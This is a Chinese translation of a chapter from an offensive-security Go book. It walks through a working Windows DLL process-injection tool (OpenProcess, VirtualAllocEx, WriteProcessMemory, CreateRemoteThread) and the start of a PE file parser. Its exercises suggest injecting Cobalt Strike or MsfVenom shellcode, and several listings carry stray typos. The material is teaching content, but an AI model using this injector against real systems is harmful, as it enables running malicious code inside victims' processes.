# 第12章：WINDOWS系统交互与分析

开发 Microsoft Windows 攻击的方法数不胜数，本章无法涵盖太多。无论在最初还是后期开发中，我们只介绍并研究几个对攻击Windows有用的技术，并非研究所有的。

我们将从三个主题来讨论后面的Microsoft API 文档和安全问题。第一，使用Go的 `syscall` 包，通过执行进程注入和各系统级的别的Window API交互。第二，探索Go的Windows Portable Executable (PE)格式核心包，并编写一个PE文件格式解析器。第三，学习在Go代码中使用C代码。

## Windows API中的OpenProcess()函数

了解了Windows API才能攻击Windows。 通过研究OpenProcess()函数来学习Window API文档，该函数用于获得远端进程的句柄。 `OpenProcess()`的文档在[https://docs.microsoft.com/en-us/windows
/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess/](https://docs.microsoft.com/en-us/windows
/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess/)。 图12-1是该功能对象的详细属性。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-1.png)

图12-1：Windows API中OpenProcess()的结构

在这个特定的实例中，可以看到该对象看起来非常类似于Go中的结构类型。 然而，c++结构中的字段类型并不一定与Go中的类型一致，而且Microsoft数据类型并不总是与Go数据类型匹配。 

Windows中数据类型的定义，请参考[https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types/](https://docs.microsoft.com/en-us/windows/desktop/WinProg/windows-data-types/)，有助于协调Windows数据类型与Go中的相应数据类型。 表12-1 涵盖了本章后面的进程注入例子中用的类型转换。

表12-1：Windows数据类型和Go数据类型的映射
|Windows数据类型| Go数据类型 |
|:--- | :--- |
| BOOLEAN | byte |
| BOOL | int32 |
| BYTE | byte |
| DWORD | uint32 |
| DWORD32 | uint32 |
| DWORD64 | uint64 |
| WORD | uint16 |
| HANDLE | uintptr (unsigned integer pointer) |
| LPVOID | uintptr |
| SIZE_T | uintptr |
| LPCVOID | uintptr |
| HMODULE | uintptr |
| LPCSTR | uintptr |
| LPDWORD | uintptr |

Go 文档将`uintptr`数据类型定义为“一种大到足以容纳任何指针的位模式的整数类型”。 这是一种特殊的数据类型，稍后在下一节“unsafe.Pointer和uintptr类型”中，讨论 Go的`unsafe`包和类型转换时会看到。 现在，完成对 Windows API 文档的浏览。

接下来应该查看对象的参数； 文档中的Parameters部分有详细介绍。 例如，第一个参数 `dwDesiredAccess`，提供了进程句柄应该拥有的有关访问级别的细节。 然后，Return Value部分定义了系统调用是否成功的预期值(图12-2)。 

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-2.png)

图12-2：定义预期的返回值


在接下来的示例代码中使用 `syscall`包时，将利用 `GetLastError`错误消息，尽管这略微偏离标准错误处理(比如if err != nil语法)。 

Windows API文档的最后是Requirements部分，含有如图12-3中的重要细节。 最后一行定义了`dynamic link library` (DLL)，包含可导出的函数(如OpenProcess())，当构建Windows DLL模块的变量声明时，它是必需的。 换句话说，我们不能在不知道合适的Windows DLL模块的情况下，从Go调用相关的Windows API函数。 随着我们进入即将到来的进程注入示例，这一点会变得更清楚。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-3.png)
图12-3：Requirements部分定义了调用API所需的库

## `unsafe.Pointer`和`uintptr`类型

在处理Go的`syscall`包时，肯定需要绕过Go的类型安全保护。 原因是我们需要，例如，建立共享内存结构并在Go和C之间执行类型转换。 本节介绍了操作内存所需要的基础知识，但是也应当进一步研究Go的官方文档。

通过使用Go的`unsafe`包（第9章涉及过的）来绕过Go的安全检查，该包含有绕过Go程序类型安全的操作。Go列出了四条基本的指导方针来帮助我们:
- 任何类型的指针值都能转换成`unsafe.Pointer`。
- `unsafe.Pointer`能够转换成任何类型的指针值。
- `uintptr` 能转换成`unsafe.Pointer`。
- `unsafe.Pointer`能转换成`uinitptr`。

**注意**
*请记住，导入`unsafe`包可能是不可移植的，而且尽管Go通常兼容Go的1版本，但使用`unsafe`包就不能保证了。*

`uintptr`类型允许原生安全类型间的转换或计算，及其他用途。 尽管`uintptr`是整数类型，也广泛的用来表示内存地址。 当与类型安全指针一起使用时，Go的GC将在运行时维护相关的引用。

然而，当`unsafe.Pointer`被引入后，情况就会发生变化。 回想下，`uintptr`本质是一个无符号的整数。 如果使用 `unsafe.Pointer` 创建了一个指针，然后赋值给`uintptr`，不能保证Go的GC能维护所引用内存地址值的完整性。 图12-4进一步描述了这个问题。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-4.png)
图12-4：使用`unsafe.Pointer`和`uintptr`时的潜在危险指针

图的上半部分是一个引用了Go的类型安全指针的`uintptr`。 因此，在运行时要维护该引用，并进行严格的GC。 图片的下半部分展示的是引用`unsafe.Pointer`类型的`uintptr`，虽然会被GC，但Go不保存也不管理任意数据类型的指针。 清单12-1描述了这个问题

``` go
func state() {
	var onload = createEvents("onload")
	var receive = createEvents("receive")
	var success = createEvents("success")
	mapEvents := make(map[string]interface{})
	mapEvents["messageOnload"] = unsafe.Pointer(onload)
	mapEvents["messageReceive"] = unsafe.Pointer(receive) 
	mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success)) 
	//This line is safe – retains orginal value
	fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer)))
	//This line is unsafe – original value could be garbage collected
	fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr))))
}

func createEvents(s string)| *string {
	return &s
}
```
清单 12-1：将`uintptr`安全地和不安全地与`unsafe.Pointer`一起使用

例如，此代码清单可能是用来创建状态机。 有三个变量，分别通过调用`createEvents()`函数赋值onload、receive和success的指针。创建`map[string]interface{}`。 使用`interface{}`类型是因为可以接收不用类型的数据。 此例中，用来接收`unsafe.Pointer`和`uintptr`类型的值。

此时，很可能已经发现了危险的代码段。 虽然`mapEvents["messageRecieve"]`的值是`unsafe.Pointer`类型，但它仍然保持对`receive`变量的原始引用，并将提供与最初相同的一致输出。 相反，`mapEvents["messageSuccess"]`的值是`uintptr`类型。 这意味着一旦`unsafe.Pointer`值引用被赋值给`uintptr`类型的`success`变量，`success`变量就会被GC释放。 此外，`uintptr`只是一种类型，保存内存地址字面意思的整数，而不是对指针的引用。 因此，无法保证预期的输出，因为该值可能不再存在。

有没有一种安全的方式一起使用`uintptr`和`unsafe.Pointer`？ 可以利用`runtime.Keepalive`来做到，`runtime.Keepalive`能够阻止变量被回收。 修改下前面的代码块来看下这个问题（清单12-2）。

``` go
func state() {
	var onload = createEvents("onload")
	var receive = createEvents("receive")
	var success = createEvents("success")
	mapEvents := make(map[string]interface{})
	mapEvents["messageOnload"] = unsafe.Pointer(onload)
	mapEvents["messageReceive"] = unsafe.Pointer(receive) 
	mapEvents["messageSuccess"] = uintptr(unsafe.Pointer(success)) 
	//This line is safe – retains orginal value
	fmt.Println(*(*string)(mapEvents["messageReceive"].(unsafe.Pointer)))
	//This line is unsafe – original value could be garbage collected
	fmt.Println(*(*string)(unsafe.Pointer(mapEvents["messageSuccess"].(uintptr))))

	runtime.KeepAlive(success)
}

func createEvents(s string)| *string {
	return &s
}
```
清单 12-2：使用`runtime.Keepalive`阻止变量被回收

严格来说，我们只添加了一行代码！`runtime .KeepAlive(success)` 这行代码告诉Go在运行时`success`变量维持可访问的，直到明确地释放或运行结束。意思是尽管`success`变量被保存为`uinitptr`，但是不会被GC，原因是明确地调用了`runtime .KeepAlive()`。

注意，Go中的`syscall`包广泛地使用了`unsafe.Pointer()`，虽然某些函数，如`syscall9()`，例外地有类型安全，但并非所有函数都用的。 此外，当做破解项目时，肯定会遇到需要以不安全的方式操作堆或堆栈内存的情况。


## 使用`syscall`包执行进程注入

通常，我们需要把代码注入到进程中。可能是因为我们想要获得对系统（shell）的远程命令行访问，甚至在源代码不可用时调试运行中的程序。 理解进程注入机制将会帮助我们执行更有趣的任务，例如加载内存中的恶意软件或钩子函数。 无论哪种方式，本节将演示如何使用Go与Microsoft Windows api交互，来执行进程注入。 我们将把存储在磁盘上的有效负载注入到已存在的进程内存中。整个过程如图12-5所示。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-5.png)
图12-5：进程注入原理

第1步，使用Windows的`OpenProcess()`函数建立进程句柄，以及所需的进程访问权限。 这是进程级交互所需要的，无论处理本地进程还是远端进程。

在第2步的Windows`VirtualAllocEx()`函数中使用获取到的进程句柄，该函数在远端进程中申请虚拟内存。这是字节级的代码（如shellcode或DLL）加载到远程内存中所必需的。

第3步，使用Windows的`WriteProcessMemory()`函数将字节级的代码加载到内存中。 注入进程到这一步，作为攻击者的我们要决定如何使用我们的shellcode或DLL。 当想要搞懂运行中的程序时，这也是需要注入调试代码的地方。

最后，第4步，使用Windows的`CreateRemoteThread()`函数调用本地导出的Windows DLL函数，如位于`Kernel32.dll`中的`LoadLibraryA()`，这样我们就可以使用`WriteProcessMemory()`来执行之前植入进程中的代码。

我们刚才描述的四个步骤只是一个基本的流程注入示例。 我们将在整个进程注入示例中定义一些额外的文件和函数，这里没有必要介绍这些文件和函数，但在遇到它们时再详细介绍。

### 定义Windows DLL和赋值变量
清单12-3中的第一步是创建`winmods`文件。（所有代码都在[https://github.com/blackhat-go/bhg/](https://github.com/blackhat-go/bhg/)。）该文件定义了本地的 Windows DLL，用于维护导出系统级的API，Go的`syscall`包调用这些API。 `winmods`文件中有比我们示例项目所需要的更多的Windows DLL模块引用的声明和分配，但我们仍会记录下，以便在更高级的注入代码中使用。

```go 
import "syscall"

var (
	ModKernel32 = syscall.NewLazyDLL("kernel32.dll")
	modUser32 = syscall.NewLazyDLL("user32.dll")
	modAdvapi32 = syscall.NewLazyDLL("Advapi32.dll")

	ProcOpenProcessToken 		= modAdvapi32.NewProc("GetProcessToken")
	ProcLookupPrivilegeValueW 	= modAdvapi32.NewProc("LookupPrivilegeValueW")
	ProcLookupPrivilegeNameW 	= modAdvapi32.NewProc("LookupPrivilegeNameW")
	ProcAdjustTokenPrivileges 	= modAdvapi32.NewProc("AdjustTokenPrivileges")
	ProcGetAsyncKeyState 		= modUser32.NewProc("GetAsyncKeyState")
	ProcVirtualAlloc 			= ModKernel32.NewProc("VirtualAlloc")
	ProcCreateThread 			= ModKernel32.NewProc("CreateThread")
	ProcWaitForSingleObject 	= ModKernel32.NewProc("WaitForSingleObject")
	ProcVirtualAllocEx 			= ModKernel32.NewProc("VirtualAllocEx")
	ProcVirtualFreeEx 			= ModKernel32.NewProc("VirtualFreeEx")
	ProcCreateRemoteThread 		= ModKernel32.NewProc("CreateRemoteThread")
	ProcGetLastError 			= ModKernel32.NewProc("GetLastError")
	ProcWriteProcessMemory 		= ModKernel32.NewProc("WriteProcessMemory")
	ProcOpenProcess 			= ModKernel32.NewProc("OpenProcess")
	ProcGetCurrentProcess 		= ModKernel32.NewProc("GetCurrentProcess")
	ProcIsDebuggerPresent 		= ModKernel32.NewProc("IsDebuggerPresent")
	ProcGetProcAddress 			= ModKernel32.NewProc("GetProcAddress")
	ProcCloseHandle 			= ModKernel32.NewProc("CloseHandle")
	ProcGetExitCodeThread 		= ModKernel32.NewProc("GetExitCodeThread")
)
```
清单12-3：winmods文件(/ch-12/procInjector/winsys/winmods.go)

使用`NewLazyDLL()`加载`Kernel32` DLL。 `Kernel32`管理了很多Windows内部进程的功能，像地址，句柄，内存申请等等。（值得注意的是，从Go版本1.12.2开始，可以使用一些新函数：`LoadLibraryEx()`和`NewLazySystemDLL()`来更好的加载DLL，并防止系统DLL被劫持攻击。）

在和DLL交互前，必须创建代码中用到的变量。 为此，为用到的每个API调用`module.NewProc`。 再次调用`OpenProcess()`，并赋值给导出的变量`ProcOpenProcess`。 `OpenProcess()`的使用是任意的；它旨在演示可以将任何导出的 Windows DLL 函数赋值给变量。


### 使用Windows`OpenProcess` API 获取进程Token

接下来，构建`OpenProcessHandle()`函数，用于获取进程句柄token。 我们会在代码中交替使用`token`和`handle`这两个术语，但是要知道Windows系统中的每个进程都有唯一的进程token。这提供了一种强制执行相关安全的模型，例如`Mandatory Integrity Control`，一种复杂的安全模型（为了更好地了解进程级的机制，这是值得研究的）。例如，安全模型包括诸如进程级权限和特权之类的项目，并规定了非特权进程和升级了的进程如何交互。 

首先，看下C++的`OpenProcess()`数据结构在Windows API文档中是如何定义的（清单12-4）。我们将定义这个对象，就好像从本机 Windows C++ 代码调用它一样。然而，我们不会这样做，因为我们将定义这个对象以与 Go 的 `syscall` 包一起使用。 因此，我们只需要把这个对象转换成Go中的数据类型。
```c++
HANDLE OpenProcess(
	DWORD dwDesiredAccess,
	BOOL bInheritHandle,
	DWORD dwProcessId
);
```
清单 12-4: Windows C++ 对象和数据类型

第一个必须的任务是将`DWORD`转换成Go中可用的类型。 `DWORD`是由Microsoft定义的32位无符号整数，和Go中的`uint32`类型相一致。 `DWORD`值声明它必须包含 `dwDesiredAccess`，或者如文档所述，“一个或多个进程访问权限”。 进程访问权限规定了我们希望对进程采取的操作，给定有效的进程token。

我们想声明一个进程访问权限的变量。因为这些值不会变，把这些相关的值都放到constants.go文件中，如清单12-5那样。 每一行定义一个进程访问权限。 清单中几乎包含了所有可用的访问权限，但是我们只使用获取进程句柄所需的权限。

```go
const (
	// docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
	PROCESS_CREATE_PROCESS 				= 0x0080
	PROCESS_CREATE_THREAD 				= 0x0002
	PROCESS_DUP_HANDLE 					= 0x0040
	PROCESS_QUERY_INFORMATION 			= 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION 	= 0x1000
	PROCESS_SET_INFORMATION 			= 0x0200
	PROCESS_SET_QUOTA 					= 0x0100
	PROCESS_SUSPEND_RESUME 				= 0x0800
	PROCESS_TERMINATE 					= 0x0001
	PROCESS_VM_OPERATION 				= 0x0008
	PROCESS_VM_READ 					= 0x0010
	PROCESS_VM_WRITE 					= 0x0020
	PROCESS_ALL_ACCESS 					= 0x001F0FFF
)
```
清单12-5：声明进程访问权限的常量部分（/ch-12/procInjector/winsys/constants.go）

清单12-5中定义的所有的进程访问权限都与它们各自的十六进制常量值相一致，这是将它们赋值给 Go 变量所需的格式。

在查看清单12-6之前，我们想描述一个问题是，下面的大多数进程注入函数，不仅仅是`OpenProcessHandle()`，将使用 `Inject` 类型的自定义对象并返回 `error` 类型的值。 `Inject`机构（清单12-6）包含几个值，这些值通过`syscall`提供给Windows相关的函数。

```go
type Inject struct {
	Pid uint32
	DllPath string
	DLLSize uint32
	Privilege string
	RemoteProcHandle uintptr
	Lpaddr uintptr
	LoadLibAddr uintptr
	RThread uintptr
	Token TOKEN
}
type TOKEN struct {
	tokenHandle syscall.Token
}
```
清单 12-6：持有几个进程注入数据类型的`injection`结构体（/ch-12/procInjector/winsys/models.go）

清单12-7展示了第一个实际函数 `OpenProcessHandle()`。 来看下下面的代码块，并讨论下细节。

```go
func OpenProcessHandle(i *Inject) error {
	var rights uint32 = PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ
	var inheritHandle uint32 = 0
	var processID uint32 = i.Pid
	remoteProcHandle, _, lastErry := ProcOpenProcess.Callz(
		uintptr(rights), // DWORD dwDesiredAccess
		uintptr(inheritHandle), // BOOL bInheritHandle
		uintptr(processID)) // DWORD dwProcessId
	if remoteProcHandle == 0 {
		return errors.Wrap(lastErr, `[!] ERROR :Can't Open Remote Process. Maybe running w elevated integrity?`)
	}
	i.RemoteProcHandle = remoteProcHandle
	fmt.Printf("[-] Input PID: %v\n", i.Pid)
	fmt.Printf("[-] Input DLL: %v\n", i.DllPath)
	fmt.Printf("[+] Process handle: %v\n", unsafe.Pointer(i.RemoteProcHandle))
	return nil
}
```
清单 12-7：用于获取进程句柄的`OpenProcessHandle()`函数 (/ch-12/procInjector/winsys/inject.go)


代码开始先把进程访问权限赋值给`uint32`类型的`rights`变量。 分配的实际包含 `PROCESS_CREATE_THREAD`，该值允许我们在远端进程中创建线程。 接下来是`PROCESS_QUERY_INFORMATION`，用来查询远端进程的详情。 最后是三个进程访问权限，`PROCESS_VM_OPERATION`， `PROCESS_VM_WRITE`， 和 `PROCESS_VM_READ`，这三个可以管理远端进程的虚拟内存。

接下来声明变量`inheritHandle`，指示新进程句柄是否继承现有句柄。 传入0表示布尔值为false，因为要创建新进程句柄。 紧随其后的是`processID`变量，包含被攻击进程的PID。 与此同时，调整变量类型使和Windows API文档中的一致，这样声明的两个变量类型都是`uint32`。 这种模式一直持续到我们使用 `ProcOpenProcess.Call()` 进行系统调用。

`ProcOpenProcess.Call()`方法参数为几个`uintprt`类型的值，如果看下该方法的签名，这些值可能会被声明为`...uintptr`。另外，返回值类型也被设计为`uintptr`和`error`。而且，错误类型被命名为`lastErr`，可以再Windows API
文档中找到它的引用，并包含由实际调用函数定义的返回错误值。

### 使用Windows API `VirtualAllocEx` 操作内存

既然已经有了远端进程句柄，我们就需要个方法在远端进程中申请虚拟内存。这是必要的，以便留出一个内存区域，并在写入之前初始化。现在就来创建它。将清单12-8中定义的函数放到清单12-7中的函数后面。（在浏览进程注入代码过程中，我们会一个接一个地添加函数。）

```go
func VirtualAllocEx(i *Inject) error {
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE 
    var flProtect uint32 = PAGE_EXECUTE_READWRITE 		lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
i.RemoteProcHandle, // HANDLE hProcess
uintptr(nullRef), // LPVOID lpAddressu
uintptr(i.DLLSize), // SIZE_T dwSize
uintptr(flAllocationType), // DWORD flAllocationType
// https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants
uintptr(flProtect)) // DWORD flProtect 
    if lpBaseAddress == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Allocate Memory On Remote Process.") 
    }
	i.Lpaddr = lpBaseAddress
	fmt.Printf("[+] Base memory address: %v\n", unsafe.Pointer(i.Lpaddr)) 
    return nil
}
```

清单12-8 通过`VirtualAllocEx`在远端进程中申请内存（/ch-12/procInjector /winsys/inject.go）


不像前面`OpenProcess()`系统调用，通过`nullRef`变量介绍一种新的细节。Go中所有的 `null` 用 `nil` 关键字代表。然而，这是个有类型的值，也就是通过没有类型的`syscall`直接传递会导致运行时错误，或类型转换错误——无论哪种错误，都是糟糕的状况。在本例中修复非常简单：声明一个0值的变量，例如整数。0值现在可以被接收的Windows函数可靠地传递和解释为`null`值。


### 使用Windows API `WriteProcessMemory` 写内存

下一步，使用`WriteProcessMemory`函数写入前面使用`VirtualAllocEx()`函数初始化过的远端进程内存。 清单12-9中，通过按文件路径调用DLL使流程简单，而并非将整个DLL代码写入内存。

```go
func WriteProcessMemory(i *Inject) error {
	var nBytesWritten *byte
	dllPathBytes, err := syscall.BytePtrFromString(i.DllPath) 
	if err != nil {
		return err
	}
	writeMem, _, lastErr := ProcWriteProcessMemory.Call(
		i.RemoteProcHandle, // HANDLE hProcess
		i.Lpaddr, // LPVOID lpBaseAddress
		uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer 
		uintptr(i.DLLSize), // SIZE_T nSize
		uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T *lpNumberOfBytesWritten
	if writeMem == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
	}
	return nil
}
```
清单 12-9:
将 DLL 文件路径写入远端进程的内存中（/ch-12/procInjector/winsys/inject.go）

首先注意的是`syscall`中的`BytePtrFromString()`函数，这是个方便将`string`转换成`byte`切片的函数，将返回结果赋值给`dllPathBytes`。

最后，看下`unsafe.Pointer`的作用。`ProcWriteProcessMemory.Call`中的第三个参数在Windows API规范中定义为“lpBuffer——指向包含写入指定进程的地址空间的数据缓冲区的指针。” 为了将 `dllPathBytes` 中定义的 Go 指针传递 Windows 函数，使用`unsafe.Pointer`来规避类型转换。这里要说明的最后一点是 `uintptr` 和 `unsafe.Pointer` 可以放心地使用，因为这两者都是内联使用，并且没有赋值给返回值来重用。


### 使用Windows API `GetProcessAddress` 查找 `LoadLibraryA`

`Kernel32.dll`有个名为 `LoadLibraryA()` 的函数，该函数对所有的Windows版本都适用。Microsoft文档声明`LoadLibraryA()`“将指定的模块加载到调用进程的地址空间中。 也可能会加载指定模块引用的其他模块。” 在创建执行实际进程注入所需远端线程前，需先获取到`LoadLibraryA()`的内存地址。 这就需要用到`GetLoadLibAddress()`函数——前面提到的那些支持函数之一（清单 12-10）。

```go
func GetLoadLibAddress(i *Inject) error {
	var llibBytePtr *byte
	llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") 
	if err != nil {
		return err
	}
	lladdr, _, lastErr := ProcGetProcAddress.Callv(
		ModKernel32.Handle(), // HMODULE hModule 
		uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName x
	if &lladdr == nil {
		return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
	}
	i.LoadLibAddr = lladdr
	fmt.Printf("[+] Kernel32.Dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))
	fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
	return nil
}
```
清单 12-10:
使用Windows函数`GetProcessAddress()`获取`LoadLibraryA()`内存地址（/ch-12/procInjector/winsys/inject.go）

使用 `GetProcessAddress()` Windows 函数来确定调用 `CreateRemoteThread()` 函数所需的 `LoadLibraryA() `的起始内存地址。 `ProcGetProcAddress.Call()` 函数有两个参数：第一个是 `Kernel32.dll` 的句柄，其中包含`LoadLibraryA() `，第二个是从字符串"LoadLibraryA"转换来的`byte`切片。


### 使用Windows API `CreateRemoteThread` 执行恶意的DLL

使用 `CreateRemoteThread()` Windows 函数针对远端进程的虚拟内存区域创建一个线程。 如果该区域恰好是 `LoadLibraryA()`，现在就可以加载并执行包含恶意 DLL 文件路径的内存区域。 看下清单12-11。

```go
func CreateRemoteThread(i *Inject) error {
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
		i.RemoteProcHandle, // HANDLE hProcess 
		uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes
		uintptr(nullRef), // SIZE_T dwStackSize
		i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress 
		i.Lpaddr, // LPVOID lpParameter 
		uintptr(dwCreationFlags), // DWORD dwCreationFlags
		uintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId
	)
	if remoteThread == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
	}
	i.RThread = remoteThread
	fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
	fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
	return nil
}
```
清单 12-11：
使用 `CreateRemoteThread()` Windows 函数执行进程注入 （/ch-12/procInjector/winsys/inject.go）

`ProcCreateRemoteThread.Call()`函数总共需要七个参数，但在示例中只用到了三个。 相关的参数是包含被入侵进程句柄的`RemoteProcHandle`，包含线程要调用的start routine 的`LoadLibAddr`（在本例中为 LoadLibraryA()），最后是指向保存有效负载位置的虚拟内存的指针。


### 使用Windows API `WaitforSingleObject` 验证注入

使用Windows的`WaitforSingleObject()`函数来识别特定对象何时处于信号状态。 这和进程注入有关，因为我们希望等待线程执行，防止其过早退出。 简要讨论清单 12-12 中的函数定义。

```go
func WaitForSingleObject(i *Inject) error {
	var dwMilliseconds uint32 = INFINITE
	var dwExitCode uint32
	rWaitValue, _, lastErr := ProcWaitForSingleObject.Call( 
		i.RThread, // HANDLE hHandle
		uintptr(dwMilliseconds)) // DWORD dwMilliseconds
	if rWaitValue != 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")
	}
	success, _, lastErr := ProcGetExitCodeThread.Call( 
		i.RThread, // HANDLE hThread
		uintptr(unsafe.Pointer(&dwExitCode))) // LPDWORD lpExitCode
	if success == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")
	}
	closed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject 
	if closed == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
	}
	return nil
}
```
清单 12-12：
使用Windows的`WaitforSingleObject()`函数确保线程成功执行（/ch-12/procInjector/winsys/inject.go）

代码中有三个地方需要注意。第一，`ProcWaitForSingleObject.Call()`系统调用传递的是清单12-11返回的线程句柄。 第二个参数是`INFINITE`的等待值，以声明与事件关联的无限到期时间。

接下来是`ProcGetExitCodeThread.Call()`，确定线程是否成功结束。 如果成功结束，`LoadLibraryA` 应当会被调用，且我们的DLL会被执行。 最后，就像我们清理所有的句柄一样，传递给`ProcCloseHandle.Call()`系统调用以便明确地关闭线程对象的句柄。


### 使用Windows API `VirtualFreeEx` 清理

使用Windows的`VirtualFreeEx()`函数释放，或取消提交，在清单12-8中通过`VirtualAllocEx()`申请的虚拟内存。 这是清理内存所必需的，因为考虑到注入远端进程的代码的整体大小，初始化的内存区域可能相当大，例如整个的DLL。来看下代码（清单12-13）。

```go
func VirtualFreeEx(i *Inject) error {
	var dwFreeType uint32 = MEM_RELEASE
	var size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region
	rFreeValue, _, lastErr := ProcVirtualFreeEx.Callu(
		i.RemoteProcHandle, // HANDLE hProcess v
		i.Lpaddr, // LPVOID lpAddress w
		uintptr(size), // SIZE_T dwSize x
		uintptr(dwFreeType)) // DWORD dwFreeType y
	if rFreeValue == 0 {
		return errors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")
	}
	fmt.Println("[+] Success: Freed memory region")
	return nil
}
```
清单 12-13：
使用Windows的`VirtualFreeEx()`函数释放内存（/ch-12/procInjector
/winsys/inject.go）

`ProcVirtualFreeEx.Call()` 函数有四个参数。第一个是远端进程句柄，与要释放其内存的进程关联。 下一个是指向释放内存地址的指针。

注意，变量`size`赋值为0。 如 Windows API 规范中所规定那样，把整个内存区间释放回可回收的状态这是必要的。 最后，我们通过`MEM_RELEASE` 操作来完全释放进程内存（以及我们对进程注入的讨论）。

### 附加练习

像本书中的其他章节那样，如果您在此过程中进行编码和实验，本章会有很高的价值。因此，我们用一些挑战或可能性来结束本节，以扩展已经涵盖的想法：

- 创建代码注入最重要的方面之一是维护一个足以检查和调试进程执行的可用工具链。 下载并安装Process Hacker 和 Process Monitor ，然后，使用 Process Hacker，定位 `Kernel32` 和 `LoadLibrary` 的内存地址。在此过程中，找到进程句柄并查看完整性级别以及固有特权。现在将您的代码注入同一个进程并定位线程。

- 可以将流程注入示例扩展为不那么琐碎。例如，不是从磁盘文件路径加载有效负载，而是使用 MsfVenom 或 Cobalt Strike 生成 shellcode 并将其直接加载到进程内存中。这需要修改 `VirtualAllocEx` 和 `LoadLibrary`。

- 创建DLL并将整个DLL加载到内存中。这类似于之前的练习：唯一的不同是加载整个 DLL 而不是 shellcode。 使用Process Monitor设置路径过滤器、进程过滤器或两者都设置，并观察系统 DLL 加载顺序。什么妨碍 DLL 加载顺序劫持？

- 使用Frida [https://www.frida.re/](https://www.frida.re/)把Google Chrome V8 JavaScript 引擎注入到受害进程中。它在移动安全从业者和开发人员中拥有大量的用户：可以使用它来执行运行时分析、进程内调试和检测。还可以将 Frida 与其他操作系统一起使用，例如 Windows。创建自己的 Go 代码，将 Frida 注入受害者进程，并使用 Frida 在同一进程中运行 JavaScript。熟悉 Frida 的工作方式需要进行一些研究，但我们保证这是非常值得的。



## 便携式可执行文件

有时我们需要一种工具来传递我们的恶意代码。例如，这可能是一个新生成的可执行文件（通过预先存在的代码中的漏洞传递），或者是系统上已存在且修改过的可执行文件。如果我们想修改现有的可执行文件，我们需要了解 Windows `Portable Executable (PE) `文件的二进制数据格式的结构，因为它规定了如何构建可执行文件以及可执行文件的功能。在本节中，我们将介绍 PE 数据结构和 Go 的 PE 包，并构建一个 PE 二进制解析器，可以用来浏览 PE 二进制的结构。

### 了解PE文件格式

首先来探讨下PE数据结构的格式。 Windows PE文件格式是一种数据结构，最常表示为可执行文件、目标代码或 DLL。PE 格式还维护对 PE 二进制文件初始操作系统加载期间使用的所有资源的引用，包括用于按序维护导出函数的导出地址表 (EAT)，用于按名称维护导出函数的导出名称表，导入地址表 (IAT)，导入名称表，线程本地存储和资源管理等结构。可以在[https://docs.microsoft.com/en-us/windows/win32/debug/pe-format/](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format/) 找到PE格式的说明。 图12-6展示了PE数据结构：Windows 二进制文件的可视化表示。

![](https://github.com/YYRise/black-hat-go/raw/master/ch-12/images/12-6.png)
图 12-6：Windows PE 文件格式

在构建PE解析器时，将自上而下地审查每一部分。

### 编写PE解析器

通过下面的部分，编写分析 Windows 二进制可执行文件中的每个 PE 部分所需的各个解析器组件。例如，我们将使用与位于 https://telegram.org 的 Telegram 消息应用程序的二进制文件关联的 PE 格式，因为这个应用程序不像经常被过度使用的 putty SSH 二进制示例那么简单，并且以 PE 格式分发。 几乎可以使用任何 Windows 二进制可执行文件，也鼓励您调研其他可执行文件。

#### 加载PE二进制和文件I/O

清单12-14中，首先使用 Go 的PE 包来准备 Telegram 二进制文件以供进一步解析。可以将解析器代码放到单独一个文件的main()函数中。

```go
import (
    "debug/pe"
    "encoding/binary" "fmt"
    "io"
    "log"
    "os" 
)
func main() {
    f, err := os.Open("Telegram.exe")
    check(err)
    pefile, err := pe.NewFile(f)
    check(err)
    defer f.Close() defer pefile.Close()
```

清单 12-14：PE 二进制的文件I/O (/ch-12/peParser/main.go)

在查看每个 PE 结构组件之前，需要使用 Go PE 包对初始导入和文件 I/O 进行存根。分别使用  `os.Open()` 和 `pe.NewFile()` 创建文件句柄和 PE 文件对象。这是必要的，因为我们打算使用 Reader 对象（例如文件或二进制读取器）来解析 PE 文件内容。

#### 解析 DOS Header和 DOS Stub

